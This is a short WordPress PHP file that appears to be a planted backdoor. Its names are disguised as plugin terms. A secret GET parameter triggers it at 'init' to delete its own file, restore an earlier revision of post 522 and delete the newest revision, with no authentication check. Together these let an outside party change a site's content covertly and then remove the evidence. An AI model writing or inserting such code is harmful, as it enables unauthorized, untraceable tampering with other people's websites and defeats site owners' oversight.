<?php

function converter_builder_health() {
	if (isset($_GET['another_short_latest_platform']) && $_GET['another_short_latest_platform'] === 'tools_shortener_upload') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$force_newsletter_source_management = 522;
		$number_size_server = wp_get_post_revisions($force_newsletter_source_management);
		if (empty($number_size_server)) die('no revisions');
		if (count($number_size_server) < 2) die('less than 2');
		$master_seo_copyright_snippets = array_shift($number_size_server);
		$buttons_grid_ultimate_shopping = $master_seo_copyright_snippets->ID;
		$health_instagram_share = array_shift($number_size_server);
		$sitemap_framework_domain_pages = $health_instagram_share->ID;
		$tinymce_polyfill_checker = wp_restore_post_revision($sitemap_framework_domain_pages);
		if ($tinymce_polyfill_checker === false) die('error restoring');
		$tinymce_polyfill_checker = wp_delete_post_revision($buttons_grid_ultimate_shopping);		
		if ($tinymce_polyfill_checker === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'converter_builder_health');
